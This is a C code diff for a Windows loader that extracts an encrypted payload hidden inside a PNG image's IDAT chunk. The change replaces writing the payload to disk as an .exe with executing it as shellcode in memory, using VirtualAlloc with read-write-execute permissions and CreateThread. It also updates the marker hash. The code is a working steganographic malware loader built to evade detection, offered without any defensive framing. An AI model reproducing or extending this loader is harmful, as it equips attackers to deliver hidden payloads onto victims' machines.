@@ -19,7 +19,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	 0x772FC3A
+#define MARKED_IDAT_HASH	  0x501EA8FD
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -195,38 +195,6 @@ BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OU
 	return bFoundHash;
 }
 
-// Function to write the extracted payload to disk
-BOOL WriteFileToDiskA(IN LPCSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {
-
-	HANDLE		hFile = INVALID_HANDLE_VALUE;
-	DWORD		dwNumberOfBytesWritten = 0x00;
-
-	if (!cFileName || !pFileBuffer || !dwFileSize)
-		goto _END_OF_FUNC;
-
-	printf("[i] Creating %s ... ", cFileName);
-
-	// Create file
-	if ((hFile = CreateFileA(cFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
-		goto _END_OF_FUNC;
-	}
-
-	// Write file
-	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
-		printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
-		goto _END_OF_FUNC;
-	}
-
-	printf("[+] DONE\n");
-
-	// Error handler
-_END_OF_FUNC:
-	if (hFile != INVALID_HANDLE_VALUE)
-		CloseHandle(hFile);
-	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
-}
-
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 
 // Function to read a file from disk
@@ -282,20 +250,42 @@ _END_OF_FUNC:
 
 int fetchPayload() {
 
-	PBYTE	pPngFileBuffer = NULL,
-		pExeFileBuffer = NULL;
-
-	SIZE_T	sPngFileSize = 0x00,
-		sExeFileSize = 0x00;
+	PBYTE pPngFileBuffer = NULL;
+	PBYTE pShellcodeBuffer = NULL;
+	SIZE_T sPngFileSize = 0x00;
+	SIZE_T sShellcodeSize = 0x00;
 
 	// Read PNG file from disk
 	if (!ReadFileFromDiskA("output.png", &pPngFileBuffer, &sPngFileSize))
 		return -1;
 
 	// Extract decrypted payload from PNG file
-	if (!ExtractDecryptedPayload(pPngFileBuffer, sPngFileSize, &pExeFileBuffer, &sExeFileSize))
+	if (!ExtractDecryptedPayload(pPngFileBuffer, sPngFileSize, &pShellcodeBuffer, &sShellcodeSize))
 		return -1;
 
-	// Write extracted payload to disk
-	return WriteFileToDiskA("ExtractedPayload.exe", pExeFileBuffer, sExeFileSize) ? 0 : -1;
+	// Allocate executable memory for the shellcode
+	LPVOID pExecMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (!pExecMemory) {
+		printf("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
+		return -1;
+	}
+
+	// Copy the shellcode to the allocated memory
+	memcpy(pExecMemory, pShellcodeBuffer, sShellcodeSize);
+
+	// Create a thread to execute the shellcode
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMemory, NULL, 0, NULL);
+	if (!hThread) {
+		printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
+		VirtualFree(pExecMemory, 0, MEM_RELEASE);
+		return -1;
+	}
+
+	// Wait for the shellcode to finish executing
+	WaitForSingleObject(hThread, INFINITE);
+
+	// Clean up
+	CloseHandle(hThread);
+	VirtualFree(pExecMemory, 0, MEM_RELEASE);
+	return 0;
 }
